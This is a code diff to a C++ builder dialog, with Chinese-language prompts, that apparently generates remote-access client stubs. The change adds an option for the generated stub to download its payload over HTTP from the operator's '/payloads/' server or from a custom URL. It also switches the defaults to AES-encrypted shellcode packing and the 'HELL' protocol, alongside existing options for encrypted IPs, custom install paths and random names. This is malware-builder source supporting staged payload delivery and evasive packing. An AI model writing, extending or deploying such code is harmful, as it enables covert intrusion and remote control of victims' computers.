@@ -108,6 +108,7 @@ CBuildDlg::CBuildDlg(CWnd* pParent)
     , m_strEncryptIP(_T("是"))
     , m_sInstallDir(_T(""))
     , m_sInstallName(_T(""))
+    , m_sDownloadUrl(_T(""))
 {
 
 }
@@ -140,6 +141,11 @@ void CBuildDlg::DoDataExchange(CDataExchange* pDX)
     DDV_MaxChars(pDX, m_sInstallDir, 31);
     DDX_Text(pDX, IDC_EDIT_INSTALL_NAME, m_sInstallName);
     DDV_MaxChars(pDX, m_sInstallName, 31);
+    DDX_Control(pDX, IDC_CHECK_FILESERVER, m_BtnFileServer);
+    DDX_Control(pDX, IDC_STATIC_DOWNLOAD, m_StaticDownload);
+    DDX_Control(pDX, IDC_EDIT_DOWNLOAD_URL, m_EditDownloadUrl);
+    DDX_Text(pDX, IDC_EDIT_DOWNLOAD_URL, m_sDownloadUrl);
+	DDV_MaxChars(pDX, m_sDownloadUrl, 255);
 }
 
 
@@ -157,6 +163,8 @@ BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
     ON_EN_KILLFOCUS(IDC_EDIT_INSTALL_DIR, &CBuildDlg::OnEnKillfocusEditInstallDir)
     ON_EN_KILLFOCUS(IDC_EDIT_INSTALL_NAME, &CBuildDlg::OnEnKillfocusEditInstallName)
     ON_COMMAND(ID_RANDOM_NAME, &CBuildDlg::OnRandomName)
+    ON_BN_CLICKED(IDC_CHECK_FILESERVER, &CBuildDlg::OnBnClickedCheckFileserver)
+    ON_CBN_SELCHANGE(IDC_COMBO_PAYLOAD, &CBuildDlg::OnCbnSelchangeComboPayload)
 END_MESSAGE_MAP()
 
 
@@ -202,6 +210,7 @@ typedef struct SCInfo {
     int offset;
     char file[_MAX_PATH];
     char targetDir[_MAX_PATH];
+    char downloadUrl[_MAX_PATH];
 } SCInfo;
 
 #define GetAddr(mod, name) GetProcAddress(GetModuleHandleA(mod), name)
@@ -278,6 +287,12 @@ bool IsValidFileName(const CString& strName)
         return false;
 
     return true;
+}
+
+CString BuildPayloadUrl(const char* ip, const char* name) {
+    static int port = THIS_CFG.GetInt("settings", "FileSvrPort", 80);
+    CString url = CString("http://") + CString(ip) + ":" + std::to_string(port).c_str() + CString("/payloads/") + name;
+    return url;
 }
 
 void CBuildDlg::OnBnClickedOk()
@@ -478,7 +493,12 @@ void CBuildDlg::OnBnClickedOk()
                                 sc->offset = n == Payload_Raw ? 0 : GetFileSize(payload);
                                 strcpy(sc->file, PathFindFileNameA(payload));
                                 strcpy(sc->targetDir, targetDir);
-                                tip = payload.IsEmpty() ? "\r\n警告: 没有生成载荷!" : "\r\n提示: 载荷文件必须拷贝至程序目录。";
+                                BOOL checked = m_BtnFileServer.GetCheck() == BST_CHECKED;
+                                if (checked){
+                                    strcpy(sc->downloadUrl, m_sDownloadUrl.IsEmpty() ? BuildPayloadUrl(m_strIP, sc->file) : m_sDownloadUrl);
+                                }
+                                tip = payload.IsEmpty() ? "\r\n警告: 没有生成载荷!" : 
+                                    checked ? "\r\n提示: 载荷文件必须拷贝至\"Payloads\"目录。" : "\r\n提示: 载荷文件必须拷贝至程序目录。";
                             }
                             BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
                             if (r) {
@@ -593,14 +613,14 @@ BOOL CBuildDlg::OnInitDialog()
 
     m_ComboEncrypt.InsertString(PROTOCOL_SHINE, "Shine");
     m_ComboEncrypt.InsertString(PROTOCOL_HELL, "HELL");
-    m_ComboEncrypt.SetCurSel(PROTOCOL_SHINE);
+    m_ComboEncrypt.SetCurSel(PROTOCOL_HELL);
 
     m_ComboCompress.InsertString(CLIENT_COMPRESS_NONE, "无");
     m_ComboCompress.InsertString(CLIENT_COMPRESS_UPX, "UPX");
     m_ComboCompress.InsertString(CLIENT_COMPRESS_SC_AES, "ShellCode AES");
     m_ComboCompress.InsertString(CLIENT_PE_TO_SEHLLCODE, "PE->ShellCode");
     m_ComboCompress.InsertString(CLIENT_COMPRESS_SC_AES_OLD, "ShellCode AES<Old>");
-    m_ComboCompress.SetCurSel(CLIENT_COMPRESS_NONE);
+    m_ComboCompress.SetCurSel(CLIENT_COMPRESS_SC_AES_OLD);
 
     m_ComboPayload.InsertString(Payload_Self, "载荷写入当前程序尾部");
     m_ComboPayload.InsertString(Payload_Raw, "载荷写入单独的二进制文件");
@@ -612,6 +632,11 @@ BOOL CBuildDlg::OnInitDialog()
     m_ComboPayload.SetCurSel(Payload_Self);
     m_ComboPayload.ShowWindow(SW_HIDE);
     m_StaticPayload.ShowWindow(SW_HIDE);
+
+    m_BtnFileServer.ShowWindow(SW_HIDE);
+    m_BtnFileServer.SetCheck(BST_UNCHECKED);
+    m_StaticDownload.ShowWindow(SW_HIDE);
+    m_EditDownloadUrl.ShowWindow(SW_HIDE);
 
     m_OtherItem.ShowWindow(SW_HIDE);
 
@@ -733,6 +758,11 @@ void CBuildDlg::OnCbnSelchangeComboCompress()
     m_ComboPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
     m_StaticPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
     m_ComboPayload.SetFocus();
+    m_BtnFileServer.ShowWindow(
+        m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES && m_ComboPayload.GetCurSel() ? SW_SHOW : SW_HIDE);
+    m_BtnFileServer.SetCheck(BST_UNCHECKED);
+    m_StaticDownload.ShowWindow(SW_HIDE);
+    m_EditDownloadUrl.ShowWindow(SW_HIDE);
 	static bool warned = false;
     if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES && !warned) {
 		warned = true;
@@ -870,4 +900,27 @@ void CBuildDlg::OnRandomName()
     CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
     SubMenu->CheckMenuItem(ID_RANDOM_NAME, b ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "RandomName", b);
+}
+
+void CBuildDlg::OnBnClickedCheckFileserver()
+{
+    BOOL checked = m_BtnFileServer.GetCheck() == BST_CHECKED;
+    m_StaticDownload.ShowWindow(checked ? SW_SHOW : SW_HIDE);
+    m_EditDownloadUrl.ShowWindow(checked ? SW_SHOW : SW_HIDE);
+    static bool warned = false;
+    if (!warned && checked) {
+        warned = true;
+        MessageBoxA("请提供载荷的下载地址。下载地址前缀为 http 或 https。"
+            "默认由本机提供载荷下载服务，请将载荷文件放在\"Payloads\"目录。"
+            "由本机提供下载时，下载地址可以省略输入。", "提示", MB_ICONINFORMATION);
+    }
+}
+
+void CBuildDlg::OnCbnSelchangeComboPayload()
+{
+    m_BtnFileServer.ShowWindow(
+        m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES && m_ComboPayload.GetCurSel() ? SW_SHOW : SW_HIDE);
+    m_BtnFileServer.SetCheck(BST_UNCHECKED);
+    m_StaticDownload.ShowWindow(SW_HIDE);
+    m_EditDownloadUrl.ShowWindow(SW_HIDE);
 }
